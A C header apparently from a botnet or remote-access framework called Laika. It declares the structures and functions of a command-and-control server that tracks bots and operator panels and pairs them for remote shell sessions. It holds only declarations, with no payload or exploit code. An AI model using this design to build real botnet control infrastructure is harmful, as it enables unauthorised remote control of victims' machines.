#ifndef LAIKA_CNC_H
#define LAIKA_CNC_H

#include "laika.h"
#include "lpacket.h"
#include "lsocket.h"
#include "lpolllist.h"
#include "lpeer.h"
#include "hashmap.h"

typedef bool (*tLaika_peerIter)(struct sLaika_peer *peer, void *uData);

struct sLaika_peerInfo {
    struct sLaika_cnc *cnc;
};

#define BASE_PEERINFO struct sLaika_peerInfo info;

struct sLaika_botInfo {
    BASE_PEERINFO
    struct sLaika_peer *shellAuth; /* currently connected shell */
};

struct sLaika_authInfo {
    BASE_PEERINFO
    struct sLaika_peer *shellBot; /* currently connected shell */
};

#undef BASE_PEERINFO

struct sLaika_cnc {
    uint8_t priv[crypto_kx_SECRETKEYBYTES], pub[crypto_kx_PUBLICKEYBYTES];
    struct sLaika_socket sock;
    struct sLaika_pollList pList;
    struct hashmap *peers; /* holds all peers, lookup using pubkey */
    struct sLaika_peer **authPeers; /* holds connected panel peers */
    uint8_t **authKeys;
    int authKeysCount;
    int authKeysCap;
    int authPeersCount;
    int authPeersCap;
    uint16_t port;
};

struct sLaika_cnc *laikaC_newCNC(uint16_t port);
void laikaC_freeCNC(struct sLaika_cnc *cnc);

void laikaC_bindServer(struct sLaika_cnc *cnc);

void laikaC_onAddPeer(struct sLaika_cnc *cnc, struct sLaika_peer *peer);
void laikaC_onRmvPeer(struct sLaika_cnc *cnc, struct sLaika_peer *peer);

void laikaC_setPeerType(struct sLaika_cnc *cnc, struct sLaika_peer *peer, PEERTYPE type);

void laikaC_addAuth(struct sLaika_cnc *cnc, struct sLaika_peer *panel);
void laikaC_rmvAuth(struct sLaika_cnc *cnc, struct sLaika_peer *panel);

void laikaC_addAuthKey(struct sLaika_cnc *cnc, const char *key);

void laikaC_killPeer(struct sLaika_cnc *cnc, struct sLaika_peer *peer);
bool laikaC_pollPeers(struct sLaika_cnc *cnc, int timeout);
void laikaC_iterPeers(struct sLaika_cnc *cnc, tLaika_peerIter iter, void *uData);

struct sLaika_peer *laikaC_getPeerByPub(struct sLaika_cnc *cnc, uint8_t *pub);

#endif